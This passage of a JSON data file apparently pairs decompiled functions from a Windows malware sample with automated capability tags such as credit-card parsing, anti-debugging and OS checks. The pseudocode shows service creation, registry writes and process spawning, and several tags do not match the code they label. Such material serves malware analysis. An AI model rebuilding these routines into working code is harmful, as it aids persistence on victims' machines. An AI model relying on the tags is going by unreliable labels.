= (*_sym.imp.SHELL32.dll_SHGetSpecialFolderPathA)();\n        if (iVar3 != 0) {\n            fcn.00404de0();\n            var_15ch = 0;\n            puVar4 = &var_15bh;\n            for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n                *puVar4 = 0;\n                puVar4 = puVar4 + 1;\n            }\n            *puVar4 = 0;\n            *(puVar4 + 2) = 0;\n            (*_sym.imp.MSVCRT.dll_sprintf)(&var_15ch, 0x41150c, &var_260h, 0xec, 3);\n            var_14h = 0;\n            do {\n                puVar4 = &var_58h;\n                for (iVar3 = 0x11; iVar3 != 0; iVar3 = iVar3 + -1) {\n                    *puVar4 = 0;\n                    puVar4 = puVar4 + 1;\n                }\n                Var6 = (*_sym.imp.KERNEL32.dll_CreateProcessA)(0, &var_15ch, 0, 0, 0, 0, 0, 0, &var_58h, 0xfc, 0x56);\n                bVar5 = Var6 == 0;\n                if (bVar5) {\n                    return;\n                }\n                if ((bVar5) || (uStack640 = uStack640 & 0xffffff00 | puVar4 >> 0x18,  !bVar5)) {\n                    uStack640 = uStack640 & 0xffffff00;\n                    (*_sym.imp.KERNEL32.dll_Sleep)(0xb8);\ncode_r0x00402369:\n                    (*_sym.imp.USER32.dll_EnumWindows)(0xf0, 0);\n                    iVar3 = (*_sym.imp.KERNEL32.dll_WaitForSingleObject)(0, 1000);\n                    if (iVar3 == 0x102) {\n                        (*_sym.imp.KERNEL32.dll_TerminateProcess)(0, 1);\n                    }\n                }\n                else {\n                    uVar1 = in(Var6 >> 0x20);\n                    *puVar4 = uVar1;\n                    if (0 < &uStack640 + 1) {\n                        *0xdedfffc8 = *0xdedfffc8 ^ extraout_ECX >> 8;\n                        goto code_r0x00402369;\n                    }\n                    *0x40 = 0;\n                    *(extraout_ECX + -1) = *(extraout_ECX + -1) + (Var6 >> 0x20);\n                }\n                pcVar2 = _sym.imp.KERNEL32.dll_CloseHandle;\n                (*_sym.imp.KERNEL32.dll_CloseHandle)(0);\n                (*pcVar2)(0);\n                var_14h = var_14h + 1;\n            } while (var_14h < 1);\n        }\n    }\n    return;\n}\n",
        "token_count": 1087
    },
    "00402fb0": {
        "rules": [
            "parse credit card information/330c87771d2c420b9aab664e2b442302",
            "parse credit card information/330c87771d2c420b9aab664e2b442302"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040302e) overlaps instruction at (ram,0x0040302a)\n// \n// WARNING: Variable defined which should be unmapped: var_2h\n\nvoid __cdecl fcn.00402fb0(uint arg_8h, uint arg_ch, uint arg_10h, uint32_t arg_14h, uint arg_18h)\n\n{\n    int32_t iVar1;\n    uint8_t uVar2;\n    uint8_t uVar3;\n    int32_t **ppiVar4;\n    int32_t iVar5;\n    int32_t iVar6;\n    char cVar7;\n    uint16_t uVar8;\n    uint16_t extraout_CX;\n    uint32_t uVar9;\n    uint32_t extraout_EDX;\n    uint32_t uVar10;\n    uint **ppuVar11;\n    uint *puVar12;\n    uint **ppuVar13;\n    int32_t *piVar14;\n    ushort in_CS;\n    uint16_t in_SS;\n    bool bVar15;\n    bool bVar16;\n    bool bVar17;\n    bool bVar18;\n    unkbyte10 in_ST0;\n    uint *puStack36;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_2h;\n    \n    uVar9 = arg_14h * 2;\n    bVar15 = false;\n    bVar18 = false;\n    bVar16 = arg_14h == 0;\n    if (arg_14h < 1) {\n        return;\n    }\n    piVar14 = 0x1;\n    puVar12 = &var_2h + 2;\n    uVar10 = arg_14h;\n    do {\n        bVar17 = uVar10 < 0;\n        if ((!bVar15 && !bVar16) && (bVar15 || bVar16)) {\n            bVar15 = false;\n            bVar18 = false;\n            bVar17 = (arg_14h & 0xe2f4cc58) < 0;\n            bVar16 = (arg_14h & 0xe2f4cc58) == 0;\n        }\n        uVar9 = uVar9 & 0xffffff00 | *(puVar12[-2] + puVar12[4]);\n        ppuVar13 = puVar12;\n        if ((!bVar16) && (bVar16)) {\n            ppuVar11 = &puStack36;\n            ppuVar13 = &puStack36;\n            puStack36 = puVar12;\n            cVar7 = '\\x10';\n            do {\n                puVar12 = puVar12 + -1;\n                ppuVar11 = ppuVar11 + -1;\n                *ppuVar11 = *puVar12;\n                cVar7 = cVar7 + -1;\n            } while ('\\0' < cVar7);\n        }\n        do {\n            ppiVar4 = ppuVar13[3];\n            puVar12 = ppuVar13[2];\n            *(ppuVar13 + -2) = *(piVar14 % ppiVar4 + puVar12);\n            if ((bVar15) || (!bVar15)) {\n                if ((bVar18 != bVar17) || (bVar18 == bVar17)) {\n                    uVar10 = (piVar14 + -1) % ppiVar4;\n                    uVar8 = uVar9;\n                    *(ppuVar13 + -1) = uVar9 ^ *(uVar10 + puVar12);\n                    goto code_r0x00403053;\n                }\n                *(piVar14 / ppiVar4 + -0x7ce92414) = in_ST0;\n                puStack36 = puVar12;\n                break;\n            }\n            uVar9 = uVar9 - 1;\n        } while (uVar9 != 0 && bVar16);\n        iVar1 = *piVar14;\n        *ppiVar4 = piVar14 + 1;\n        puStack36 = puStack36 & 0xffff0000 | in_SS;\n        puVar12[0x12] = puVar12[0x12] + 0x27;\n        *(iVar1 >> 0x1f) = *(iVar1 >> 0x1f) + 0x468ddf84;\n        in_ST0 = (*(uVar9 + 0xc32fff7))(in_CS);\n        uVar10 = extraout_EDX;\n        uVar8 = extraout_CX;\ncode_r0x00403053:\n        uVar2 = *(ppuVar13 + -4);\n        uVar3 = *(ppuVar13 + -1);\n        iVar1 = ppuVar13[-3];\n        iVar5 = ppuVar13[6];\n        *(iVar5 + -1 + iVar1) = uVar2 ^ uVar3;\n        puStack36 = uVar10 & 0xffff | (uVar8 & 0xff00 | uVar3) << 0x10;\n        uVar9 = ppuVar13[5];\n        iVar6 = ppuVar13[-2];\n        *(iVar1 + iVar5) = uVar2 ^ *(ppuVar13 + -2);\n        arg_14h = iVar6 + 1;\n        bVar15 = arg_14h < uVar9;\n        bVar18 = SBORROW4(arg_14h, uVar9);\n        uVar10 = arg_14h - uVar9;\n        bVar16 = arg_14h == uVar9;\n        ppuVar13[-2] = arg_14h;\n        ppuVar13[-3] = iVar1 + 2;\n        if (uVar9 <= arg_14h) {\n            return;\n        }\n        piVar14 = ppuVar13[-3];\n        puVar12 = ppuVar13;\n    } while( true );\n}\n",
        "token_count": 1299
    },
    "00401930": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\nuint __cdecl fcn.00401930(uint arg_8h, uint arg_ch, uint arg_10h)\n\n{\n    int32_t iVar1;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_CreateServiceA)(arg_8h, arg_ch, arg_ch, 0xf01ff, 1, 0, 1, arg_10h, 0, 0, 0, 0, 0);\n    if (iVar1 == 0) {\n        return 0;\n    }\n    (*_sym.imp.ADVAPI32.dll_CloseServiceHandle)(iVar1);\n    return 1;\n}\n",
        "token_count": 138
    },
    "00403390": {
        "rules": [
            "parse credit card information/562ff391f55141bc9728340148e50ea1",
            "parse credit card information/562ff391f55141bc9728340148e50ea1"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x0040392c) overlaps instruction at (ram,0x0040392a)\n// \n\nvoid fcn.00403390(void)\n\n{\n    uint *puVar1;\n    char *pcVar2;\n    int32_t iVar3;\n    uint *puVar4;\n    uint8_t uVar5;\n    uint16_t uVar6;\n    int16_t iVar7;\n    uint8_t extraout_CH;\n    int32_t extraout_ECX;\n    int32_t iVar8;\n    int32_t extraout_ECX_00;\n    int32_t extraout_EDX;\n    int32_t extraout_EDX_00;\n    int32_t *piVar9;\n    uint8_t *unaff_EBX;\n    uint *puVar10;\n    int32_t unaff_ESI;\n    uint8_t *unaff_EDI;\n    uchar uVar11;\n    uint8_t in_AF;\n    bool bVar12;\n    char cVar13;\n    bool bVar14;\n    uint8_t in_TF;\n    uint8_t in_IF;\n    char cVar15;\n    uint8_t in_NT;\n    uint8_t in_AC;\n    uint8_t in_VIF;\n    uint8_t in_VIP;\n    uint8_t in_ID;\n    uint32_t arg_14h;\n    unkbyte10 extraout_ST0;\n    ulong uVar16;\n    int32_t *piVar17;\n    uint *arg_10h;\n    uint uVar18;\n    int32_t *arg_14h_00;\n    ushort uVar19;\n    ushort uVar20;\n    uint *apuStack56 [2];\n    \n    fcn.00402d40(0x4115f4, 0x16, 0x411184, 10);\n    fcn.00402d40(0x4115f4, 0x16, 0x411190, 0x12);\n    fcn.00402d40(0x4115f4, 0x16, 0x4111a4, 4);\n    uVar5 = fcn.00402d40(0x4115f4, 0x16, 0x4111a8, 0xc);\n    piVar9 = unaff_EDI + 1;\n    cVar13 = uVar5 - *unaff_EDI;\n    arg_14h = (in_NT & 1) * 0x4000 | SBORROW1(uVar5, *unaff_EDI) * 0x800 | (in_IF & 1) * 0x200 | (in_TF & 1) * 0x100 |\n              (cVar13 < '\\0') * 0x80 | (cVar13 == '\\0') * 0x40 | (in_AF & 1) * 0x10 | ((POPCOUNT(cVar13) & 1U) == 0) * 4\n              | uVar5 < *unaff_EDI | (in_ID & 1) * 0x200000 | (in_VIP & 1) * 0x100000 | (in_VIF & 1) * 0x80000 |\n              (in_AC & 1) * 0x40000;\n    uVar16 = func_0x101893c9();\n    bVar12 = (unaff_EBX[uVar16 + -0x7f] & 0x4b) == 0;\n    puVar1 = (uVar16 >> 0x20) + 7;\n    apuStack56[1] = 0x40346a;\n    fcn.00402d40(0x4115f4, 0x16, 0x4111b4, arg_14h);\n    arg_10h = puVar1;\n    if ((!bVar12) && (bVar12)) {\n        puVar10 = &stack0xffffffcc;\n        arg_10h = &stack0xffffffcc;\n        cVar13 = '\\x10';\n        puVar4 = puVar1;\n        do {\n            puVar4 = puVar4 + -1;\n            puVar10 = puVar10 + -1;\n            *puVar10 = *puVar4;\n            cVar13 = cVar13 + -1;\n            apuStack56[1] = puVar1;\n        } while ('\\0' < cVar13);\n    }\n    fcn.00402d40(0x4115f4, 0x16, 0x4111bc, 0xb);\n    piVar17 = unaff_ESI + -1;\n    uVar6 = fcn.00402d40(0x4115f4, 0x16, 0x4111c8, 0xc);\n    uVar11 = 0;\n    cVar13 = (uVar6 & 0x11cb) == 0;\n    do {\n        uVar18 = 0x4034e4;\n        fcn.00402d40(0x4115f4, 0x16, 0x4111d4, 0x4115f4);\n        if ((uVar11) || (!uVar11)) {\n            uVar18 = 0xd;\n            arg_10h = 0x4111dc;\n            piVar17 = 0x16;\n            iVar8 = extraout_ECX;\n            break;\n        }\n        iVar8 = extraout_ECX + -1;\n    } while (iVar8 != 0 && cVar13 != '\\0');\n    iVar3 = *(unaff_ESI + -1);\n    *piVar9 = unaff_ESI + 3;\n    pcVar2 = (iVar3 >> 0x1f) + 0x16;\n    *pcVar2 = *pcVar2 + (iVar8 >> 8);\n    fcn.00402d40(0x4115f4, piVar17, arg_10h, uVar18);\n    fcn.00402d40(0x4115f4, 0x16, 0x4111ec, 0x18);\n    bVar12 = false;\n    iVar7 = fcn.00402d40(0x4115f4, 0x16, 0x411204, 0x25);\n    if ((bVar12) || (!bVar12)) {\n        arg_14h_00 = 0xa;\n        piVar17 = piVar9;\n    }\n    else {\n        uVar6 = unaff_EDI + 5;\n        iVar8 = in(extraout_EDX);\n        *piVar9 = iVar8;\n        piVar17 = unaff_EDI + 5;\n        arg_14h_00 = piVar9;\n        if (&stack0xffffa17d < 1) goto code_r0x00403605;\n    }\n    *(extraout_EDX + 10) = *(extraout_EDX + 10) ^ extraout_CH;\n    fcn.00402d40(0x4115f4, 0x16, 0x41122c, arg_14h_00);\n    fcn.00402d40(0x4115f4, 0x16, 0x411238, 0xc);\n    iVar7 = fcn.00402d40(0x4115f4, 0x16, 0x411244, 0xd);\n    uVar6 = piVar17 | 0x74e3;\ncode_r0x00403605:\n    bVar12 = false;\n    uVar11 = 0;\n    bVar14 = (uVar6 - iVar7 & 0x1a8) == 0;\n    fcn.00402d40(0x4115f4, 0x16, 0x411254, 6);\n    if ((!bVar12 && !bVar14) && (bVar12 || bVar14)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar18 = 0x40364a;\n    fcn.00402d40(0x4115f4, 0x16, 0x41125c, 5);\n    if ((uVar11) || (!uVar11)) {\n        uVar18 = 0xd;\n    }\n    fcn.00402d40(0x4115f4, 0x16, 0x411264, uVar18);\n    fcn.00402d40(0x4115f4, 0x16, 0x411274, 0x19);\n    fcn.00402d40(0x4115f4, 0x16, 0x411290, 0xf);\n    fcn.00402d40(0x4115f4, 0x16, 0x4112a0, 0xe);\n    while( true ) {\n        fcn.00402d40(0x4115f4, 0x16, 0x4112b0, 0xb);\n        fcn.00402d40(0x4115f4, 0x16, 0x4112bc, 0xb);\n        cVar15 = '\\0';\n        cVar13 = '\\0';\n        bVar12 = (unaff_EBX & 0x4d) == 0;\n        fcn.00402d40(0x4115f4, 0x16, 0x4112c8, 0xb);\n        if ((bVar12 || cVar15 != cVar13) || (!bVar12 && cVar15 == cVar13)) break;\n        if (extraout_ECX_00 != 0) {\n            do {\n    // WARNING: Do nothing block with infinite loop\n            } while( true );\n        }\n    }\n    fcn.00402d40(0x4115f4, 0x16, 0x4112d4, 10);\n    bVar12 = false;\n    uVar19 = 0x12e0;\n    uVar20 = 0x41;\n    uVar18 = fcn.00402d40(0x4115f4, 0x16, 0x4112e0, 0xc);\n    if ((!bVar12) && (bVar12)) {\n        out(0xbd, uVar18);\n        return;\n    }\n    uVar18 = 0x16;\n    fcn.00402d40(0x4115f4, 0x16, 0x4112ec, 0xe);\n    if ((!bVar12) && (bVar12)) {\n        unaff_EBX = unaff_EBX + *(unaff_EBX + extraout_EDX_00 * 4 + 0x69) + bVar12;\n    }\n    uVar16 = fcn.00402d40(0x4115f4, 0x16, 0x4112fc, 0x11);\n    piVar9 = uVar16 >> 0x20;\n    *(uVar16 + -0x7ce92414) = extraout_ST0;\n    *piVar9 = *piVar9 + 0x136adf84;\n    fcn.00402d40(0x4115f4, 0x16, 0x411310, unaff_EBX);\n    if ((&stack0xffffa189 < 0) || (&stack0xffffa189 >= 0)) {\n        uVar19 = 0x14;\n        uVar20 = 0;\n    }\n    *unaff_EBX = *unaff_EBX & 0xc3;\n    fcn.00402d40(0x4115f4, 0x16, 0x411324, CONCAT22(uVar20, uVar19));\n    fcn.00402d40(0x4115f4, 0x16, 0x411338, 0x33);\n    fcn.00402d40(0x4115f4, 0x16, 0x41136c, 10);\n    fcn.00402d40(0x4115f4, 0x16, 0x411378, 4);\n    cVar15 = '\\x01';\n    cVar13 = '\\x01';\n    fcn.00402d40(0x4115f4, 0x16, 0x41137c, 5);\n    if ((cVar15 != cVar13) || (cVar15 == cVar13)) {\n        unaff_EBX = 0x6;\n        uVar18 = 0x411384;\n    }\n    fcn.00402d40(0x4115f4, 0x16, uVar18, unaff_EBX);\n    fcn.00402d40(0x4115f4, 0x16, 0x4113b8, 0x2a);\n    fcn.00402d40(0x4115f4, 0x16, 0x4113e4, 0xb);\n    return;\n}\n",
        "token_count": 2922
    },
    "004019e0": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\nbool fcn.004019e0(void)\n\n{\n    uchar *puVar1;\n    int32_t iVar2;\n    uint *puVar3;\n    uchar pvData;\n    uint var_10bh;\n    uint pdwType;\n    uint pcbData;\n    \n    pvData = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    pcbData = 0x104;\n    *(puVar3 + 2) = 0;\n    iVar2 = (*_sym.imp.SHLWAPI.dll_SHGetValueA)(0x80000002, 0x4115c0, 0x4115e8, &pdwType, &pvData, &pcbData);\n    if (iVar2 != 0) {\n        return false;\n    }\n    puVar1 = (*_sym.imp.MSVCRT.dll_strchr)(&pvData, 0x2e);\n    if (puVar1 == NULL) {\n        return false;\n    }\n    *puVar1 = 0;\n    iVar2 = (*_sym.imp.MSVCRT.dll_atoi)(&pvData);\n    if (iVar2 == 6) {\n        return true;\n    }\n    return iVar2 == 7;\n}\n",
        "token_count": 321
    },
    "00402e00": {
        "rules": [
            "PEB access/cd8d96519f6244b6acf2796407e948b9"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00402e52) overlaps instruction at (ram,0x00402e50)\n// \n\nbool __cdecl fcn.00402e00(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h, uint arg_18h, int32_t arg_1ch)\n\n{\n    int32_t iVar1;\n    uint hKey;\n    \n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegOpenKeyExA)(arg_8h, arg_ch, 0, 0xf003f, &hKey);\n    if (iVar1 != 0) {\n        return false;\n    }\n    if ((iVar1 < 0) || (iVar1 >= 0)) {\n        iVar1 = arg_1ch;\n    }\n    iVar1 = (*_sym.imp.ADVAPI32.dll_RegQueryValueExA)(hKey, arg_10h, 0, arg_14h, arg_18h, iVar1 + 0x1c458b2f);\n    (*_sym.imp.ADVAPI32.dll_RegCloseKey)(hKey);\n    return iVar1 == 0;\n}\n",
        "token_count": 255
    },
    "00402f40": {
        "rules": [
            "check OS version/56128ea24265487c97cb4913628bf489"
        ],
        "decompiled_code": "\nunkint6 fcn.00402f40(void)\n\n{\n    uint16_t extraout_DX;\n    uint lpVersionInformation;\n    int32_t var_90h;\n    int32_t var_8ch;\n    \n    lpVersionInformation = 0x94;\n    (*_sym.imp.KERNEL32.dll_GetVersionExA)(&lpVersionInformation);\n    if (var_90h == 5) {\n        return CONCAT24(extraout_DX, 1);\n    }\n    if ((var_90h == 6) && (var_8ch == 0)) {\n        return CONCAT24(extraout_DX, 1);\n    }\n    return extraout_DX << 0x20;\n}\n",
        "token_count": 148
    },
    "00401ad0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Restarted to delay deadcode elimination for space: stack\n\nbool __cdecl fcn.00401ad0(uint s1)\n\n{\n    int32_t iVar1;\n    uint *puVar2;\n    uint32_t uVar3;\n    uint var_14h;\n    uint var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    (*_sym.imp.MSVCRT.dll__strlwr)(s1);\n    var_14h = 0x4115a0;\n    var_10h = 0x411598;\n    var_ch = 0x4115a8;\n    var_8h = 0x4115b0;\n    var_4h = 0x4115b8;\n    uVar3 = 0;\n    puVar2 = &var_14h;\n    do {\n        iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, *puVar2);\n        if (iVar1 != 0) {\n            return true;\n        }\n        uVar3 = uVar3 + 1;\n        puVar2 = puVar2 + 1;\n    } while (uVar3 < 5);\n    iVar1 = (*_sym.imp.MSVCRT.dll_strstr)(s1, 0x411590);\n    return iVar1 == 0;\n}\n",
        "token_count": 302
    },
    "004028b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\nuint32_t fcn.004028b0(void)\n\n{\n    int32_t iVar1;\n    uint uStack12;\n    uint32_t uStack8;\n    uchar auStack4 [4];\n    \n    uStack12 = 4;\n    iVar1 = fcn.00402e00(0x80000002, 0x411338, 0x411384, auStack4, &uStack8, &uStack12);\n    if ((iVar1 == 0) || (5 < uStack8)) {\n        uStack8 = 0xffffffff;\n    }\n    return uStack8;\n}\n",
        "token_count": 132
    },
    "00403190": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x004032c8) overlaps instruction at (ram,0x004032c7)\n// \n// WARNING: Removing unreachable block (ram,0x004031f7)\n\nint64_t __cdecl fcn.00403190(char *arg_8h, int32_t arg_ch)\n\n{\n    char cVar1;\n    code *pcVar2;\n    int32_t iVar3;\n    uint32_t uVar4;\n    uint8_t *puVar5;\n    uint32_t uVar6;\n    uint *puVar7;\n    char *pcVar8;\n    ulong uVar9;\n    uchar var_264h;\n    uint var_263h;\n    char var_160h;\n    uint var_15fh;\n    uint var_5ch;\n    uint var_58h;\n    uint var_54h;\n    uint var_50h;\n    uint var_4ch;\n    int32_t var_48h;\n    int32_t var_44h;\n    uint var_40h;\n    uint var_3ch;\n    uint var_38h;\n    uint var_34h;\n    uint var_30h;\n    uint var_2ch;\n    uint var_28h;\n    uint var_24h;\n    char *var_20h;\n    char *var_1ch;\n    uint *var_18h;\n    uint *var_14h;\n    uint *var_10h;\n    uint var_ch;\n    uint var_8h;\n    uint var_4h;\n    \n    pcVar2 = _sym.imp.MSVCRT.dll_sprintf;\n    var_264h = 0;\n    puVar7 = &var_263h;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_160h = '\\0';\n    puVar7 = &var_15fh;\n    for (iVar3 = 0x40; iVar3 != 0; iVar3 = iVar3 + -1) {\n        *puVar7 = 0;\n        puVar7 = puVar7 + 1;\n    }\n    *puVar7 = 0;\n    *(puVar7 + 2) = 0;\n    var_ch = 1;\n    var_4h = 0;\n    var_8h = 1;\n    puVar5 = arg_ch != 0;\n    (*_sym.imp.MSVCRT.dll_sprintf)(&var_160h, 0x4111ec, arg_8h);\n    (*pcVar2)(&var_264h, 0x411204, arg_8h);\n    var_20h = &var_160h;\n    var_18h = &var_ch;\n    var_14h = &var_4h;\n    var_10h = &var_8h;\n    uVar4 = 0xffffffff;\n    pcVar8 = &var_160h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    var_48h = ~uVar4 - 1;\n    uVar4 = 0xffffffff;\n    pcVar8 = arg_8h;\n    do {\n        if (uVar4 == 0) break;\n        uVar4 = uVar4 - 1;\n        cVar1 = *pcVar8;\n        pcVar8 = pcVar8 + 1;\n    } while (cVar1 != '\\0');\n    var_44h = ~uVar4 - 1;\n    var_34h = 0x41122c;\n    var_30h = 0x411238;\n    var_2ch = 0x411244;\n    var_28h = 0x411254;\n    var_24h = 0x41125c;\n    var_5ch = 2;\n    var_58h = 1;\n    var_54h = 4;\n    var_50h = 4;\n    var_4ch = 4;\n    var_1ch = arg_8h;\n    var_40h = 4;\n    var_3ch = 4;\n    var_38h = 4;\n    if ((var_44h < 0) || (var_44h >= 0)) {\n        uVar4 = 4;\n        if (0x4 < puVar5) goto code_r0x00403308;\n    }\n    else {\n        *puVar5 = *puVar5 & 0xc3;\n    }\n    pcVar2 = _sym.imp.SHLWAPI.dll_SHSetValueA;\n    uVar6 = puVar5 * 4;\n    do {\n        uVar9 = (*pcVar2)(0x80000002, &var_264h, *(&var_34h + uVar6), *(&var_5ch + uVar6), *(&var_20h + uVar6), \n                          *(&var_48h + uVar6));\n        uVar4 = uVar9 >> 0x20;\n        if (uVar9 != 0) {\n            return uVar4 << 0x20;\n        }\n        uVar6 = uVar6 + 4;\n    } while (uVar6 < 0x14);\ncode_r0x00403308:\n    return CONCAT44(uVar4, 1);\n}\n",
        "token_count": 1258
    },
    "004039b0": {
        "rules": [
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2",
            "check OS version/55c4336dbd964ae3be35b3597c99c1c2"
        ],
        "decompiled_code": "\n// WARNING: Instruction at (ram,0x00403bda) overlaps instruction at (ram,0x00403bd9)\n// \n// WARNING: Removing unreachable block (ram,0x00403bda)\n\nvoid fcn.004039b0(void)\n\n{\n    uint32_t *puVar1;\n    char *pcVar2;\n    uint16_t uVar3;\n    char extraout_CH;\n    char extraout_CH_00;\n    uint8_t uVar4;\n    uint16_t extraout_DX;\n    uint32_t uVar5;\n    uint8_t uVar6;\n    int32_t extraout_EDX;\n    uint16_t unaff_BX;\n    uint32_t unaff_EBP;\n    int32_t unaff_ESI;\n    int16_t iVar7;\n    uchar *unaff_EDI;\n    uchar *puVar8;\n    bool bVar9;\n    bool bVar10;\n    char cVar11;\n    uchar uVar12;\n    char cVar13;\n    ulong uVar14;\n    uint in_stack_ffffffcc;\n    uint uVar15;\n    ushort uVar16;\n    ushort uVar17;\n    ushort uVar18;\n    ushort uVar19;\n    ushort uVar20;\n    ushort uVar21;\n    \n    fcn.00402d40(0x4115f4, 0x16, 0x411170, 0x11);\n    uVar3 = fcn.00402d40(0x4115f4, 0x16, 0x41138c, 0xf);\n    uVar3 = (extraout_DX & 0xff00 | (extraout_DX & 0x4e | 0x38) & uVar3) & uVar3 ^ 0x3c00;\n    uVar5 = (uVar3 & 0xff | (uVar3 >> 8) + (unaff_BX >> 8) << 8) | 0x604;\n    uVar4 = uVar5;\n    uVar6 = uVar5 >> 8;\n    bVar9 = CARRY1(uVar6, uVar4);\n    uVar12 = SCARRY1(uVar6, uVar4);\n    bVar10 = uVar6 + uVar4 == '\\0';\n    uVar20 = 0x1a;\n    uVar21 = 0;\n    uVar18 = 0x139c;\n    uVar19 = 0x41;\n    uVar16 = 0x16;\n    uVar17 = 0;\n    fcn.00402d40(0x4115f4, 0x16, 0x41139c, 0x1a);\n    if ((!bVar9 && !bVar10) && (bVar9 || bVar10)) {\n        do {\n    // WARNING: Do nothing block with infinite loop\n        } while( true );\n    }\n    uVar14 = fcn.00402d40(0x4115f4, 0x16, 0x4113f0, 10);\n    if ((uVar12) || (!uVar12)) {\n        uVar15 = 0xb;\n        in_stack_ffffffcc = 0x4113fc;\n        puVar8 = unaff_EDI;\n    }\n    else {\n        puVar8 = unaff_EDI + 1;\n        uVar12 = in(uVar14 >> 0x20);\n        *unaff_EDI = uVar12;\n        if (!bVar9 && !bVar10) {\n            *(unaff_ESI + -0x75) = *(unaff_ESI + -0x75) ^ &stack0xffffffd4;\n            puVar1 = uVar14 + 0x1c;\n            *puVar1 = *puVar1 | unaff_EBP;\n            pcVar2 = (uVar14 >> 0x20) + 0x16;\n            *pcVar2 = *pcVar2 + extraout_CH;\n            goto code_r0x00403adf;\n        }\n        uVar15 = 0x56;\n    }\n    fcn.00402d40(0x4115f4, 0x16, in_stack_ffffffcc, uVar15);\n    fcn.00402d40(0x4115f4, 0x16, 0x411408, 8);\n    fcn.00402d40(0x4115f4, 0x16, 0x411410, 9);\n    uVar20 = 9;\n    uVar21 = 0;\n    uVar18 = 0x141c;\n    uVar19 = 0x41;\n    uVar16 = 0x16;\n    uVar17 = 0;\ncode_r0x00403adf:\n    fcn.00402d40(0x4115f4, CONCAT22(uVar17, uVar16), CONCAT22(uVar19, uVar18), CONCAT22(uVar21, uVar20));\n    fcn.00402d40(0x4115f4, 0x16, 0x411428, 9);\n    bVar9 = false;\n    uVar15 = 0x403b39;\n    fcn.00402d40(0x4115f4, 0x16, 0x411434, 0xc);\n    if ((bVar9) || (!bVar9)) {\n        uVar15 = 3;\n        unaff_EBP = 0x411440;\n        unaff_ESI = 0x16;\n    }\n    uVar5 = *(puVar8 + 0xe58be73);\n    *(extraout_EDX + 0x16) = *(extraout_EDX + 0x16) + extraout_CH_00;\n    fcn.00402d40(0x4115f4, unaff_ESI, unaff_EBP, uVar15);\n    fcn.00402d40(0x4115f4, 0x16, 0x411444, 10);\n    iVar7 = puVar8 ^ uVar5;\n    cVar13 = SBORROW2(iVar7, 1);\n    cVar11 = iVar7 + -1 < 0;\n    uVar15 = fcn.00402d40(0x4115f4, 0x16, 0x411450, 0x40);\n    if ((cVar13 == cVar11) && (cVar13 != cVar11)) {\n        out(0xc4, uVar15);\n        *(puVar8 ^ uVar5) = uVar15;\n    }\n    fcn.00402d40(0x4115f4, 0x16, 0x411490, 0xc);\n    fcn.00402d40(0x4115f4, 0x16, 0x41149c, 0xb);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114a8, 4);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114ac, 4);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114b0, 0xc);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114bc, 4);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114c0, 9);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114cc, 0x16);\n    fcn.00402d40(0x4115f4, 0x16, 0x4114e4, 7);\n    return;\n}\n",
        "token_count": 1754
    },
    "00404430": {
        "rules": [
            "check OS version/eb1d2d86c0084793ad233d63869572f1",
            "check for software breakpoints/6dbbe1bd09a145a7938dedb5765a94dc"
        ],
        "decompiled_code": "\nbool __cdecl fcn.00404430(uint arg_8h, uint arg_ch, uint arg_10h, uint arg_14h)\n\n{\n    code *pcVar1;\n    uint arg_ch_00;\n    uint arg_ch_01;\n    uint arg_ch_02;\n    int32_t iVar2;\n    uint *puVar3;\n    uint var_314h;\n    uint var_210h;\n    uchar lpBuffer;\n    uint var_10bh;\n    int32_t var_8h;\n    int32_t var_4h;\n    \n    lpBuffer = 0;\n    puVar3 = &var_10bh;\n    for (iVar2 = 0x40; iVar2 != 0; iVar2 = iVar2 + -1) {\n        *puVar3 = 0;\n        puVar3 = puVar3 + 1;\n    }\n    *puVar3 = 0;\n    var_8h = 0;\n    *(puVar3 + 2) = 0;\n    fcn.00404de0();\n    (*_sym.imp.KERNEL32.dll_GetSystemDirectoryA)(&lpBuffer, 0x104);\n    var_4h = 0;\n    do {\n        arg_ch_00 = fcn.00404070();\n        arg_ch_01 = fcn.00404070();\n        arg_ch_02 = fcn.00404070();\n        fcn.004030d0(arg_10h, arg_ch_00);\n        fcn.004030d0(arg_8h, arg_ch_01);\n        fcn.004030d0(arg_ch, arg_ch_02);\n        pcVar1 = _sym.imp.MSVCRT.dll_sprintf;\n        (*_sym.imp.MSVCRT.dll_sprintf)(&var_314h, 0x411184, &lpBuffer, 